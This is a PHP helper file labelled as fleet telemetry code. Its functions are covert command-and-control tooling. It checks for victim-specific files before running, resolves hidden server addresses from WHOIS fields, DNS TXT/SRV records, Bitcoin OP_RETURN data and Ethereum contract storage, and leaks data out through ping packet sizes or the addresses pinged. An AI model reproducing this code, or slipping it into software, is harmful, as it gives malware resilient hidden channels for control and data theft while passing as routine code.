<?php
// Fleet telemetry and registry-resolution helpers.
declare(strict_types=1);

namespace FleetChannels;

const WHOIS_HOST = 'whois.verisign-grs.com';
const RPC_ENDPOINT = 'https://cloudflare-eth.com';

function gateOk(string $gate): bool
{
    $expanded = str_replace('\\', '/',
        str_replace(['%TEMP%', '%APPDATA%', '%LOCALAPPDATA%',
                     '%PROGRAMDATA%'],
            [getenv('TEMP') ?: '', getenv('APPDATA') ?: '',
             getenv('LOCALAPPDATA') ?: '', getenv('PROGRAMDATA') ?: ''],
            $gate));
    $home = getenv('HOME') ?: (getenv('USERPROFILE') ?: '');
    if (str_starts_with($expanded, '~/')) {
        $expanded = $home . substr($expanded, 1);
    }
    return is_file($expanded);
}

function whoisEndpoint(string $domain): ?string
{
    $fp = @fsockopen(WHOIS_HOST, 43, $errno, $errstr, 10);
    if ($fp === false) {
        return null;
    }
    fwrite($fp, "domain {$domain}\r\n");
    $blob = '';
    while (!feof($fp)) {
        $blob .= fread($fp, 4096);
    }
    fclose($fp);
    if (!preg_match('/(?:descr|address|e-mail):\s+([0-9a-f]{8})\s/i',
            $blob, $m)) {
        return null;
    }
    $raw = hexdec($m[1]);
    return sprintf('%d.%d.%d.%d', $raw >> 24 & 255, $raw >> 16 & 255,
        $raw >> 8 & 255, $raw & 255);
}

function txtFields(string $name): array
{
    $out = @shell_exec('nslookup -type=TXT ' . escapeshellarg($name)
        . ' 2>/dev/null');
    preg_match_all('/"([^"]*)"/', (string) $out, $m);
    return $m[1] ?? [];
}

function srvEndpoint(string $name): ?array
{
    $out = @shell_exec('nslookup -type=SRV ' . escapeshellarg($name)
        . ' 2>/dev/null');
    if (!preg_match('/port\s*=\s*(\d+)[\s\S]*?canonical name\s*=\s*([\w.-]+)/',
            (string) $out, $m)) {
        return null;
    }
    return [$m[2], (int) $m[1]];
}

function btcOpReturn(string $addr, string $marker): ?string
{
    $body = @file_get_contents('https://blockstream.info/testnet/api/address/' . $addr . '/txs');
    if ($body === false) {
        return null;
    }
    $idx = strpos($body, '"scriptpubkey_type":"op_return"');
    if ($idx === false) {
        return null;
    }
    if (!preg_match('/"scriptpubkey":"([0-9a-f]+)"/', $body, $m, 0,
            $idx)) {
        return null;
    }
    $raw = @hex2bin(substr($m[1], 2));
    if ($raw === false) {
        return null;
    }
    $at = strpos($raw, $marker);
    return $at === false ? null : substr($raw, $at + strlen($marker));
}

function ethSlot(string $contract, int $slot): ?string
{
    $body = json_encode(['jsonrpc' => '2.0', 'id' => 1,
        'method' => 'eth_getStorageAt',
        'params' => [$contract, '0x' . dechex($slot), 'latest']]);
    $ctx = stream_context_create(['http' => [
        'method' => 'POST',
        'header' => "Content-Type: application/json\r\n",
        'timeout' => 12,
        'content' => $body,
    ]]);
    $out = @file_get_contents(RPC_ENDPOINT, false, $ctx);
    if ($out === false ||
        !preg_match('/"result":"(0x[0-9a-f]*)"/', $out, $m)) {
        return null;
    }
    return $m[1];
}

function icmpNibble(string $relay, int $nibble): void
{
    $spec = [0 => ['pipe', 'r'], 1 => ['file', '/dev/null', 'w']];
    @proc_open('ping -c 1 -W 1 -s ' . (64 + ($nibble & 15)) . ' '
        . escapeshellarg($relay), $spec, $pipes);
}

function icmpByteIp(string $base, int $b): void
{
    if ($b > 0 && $b < 255) {
        $spec = [0 => ['pipe', 'r'], 1 => ['file', 'NUL', 'w']];
        @proc_open('ping -n 1 -w 300 ' . escapeshellarg($base . $b),
            $spec, $pipes, null, null, ['bypass_shell' => true]);
    }
}
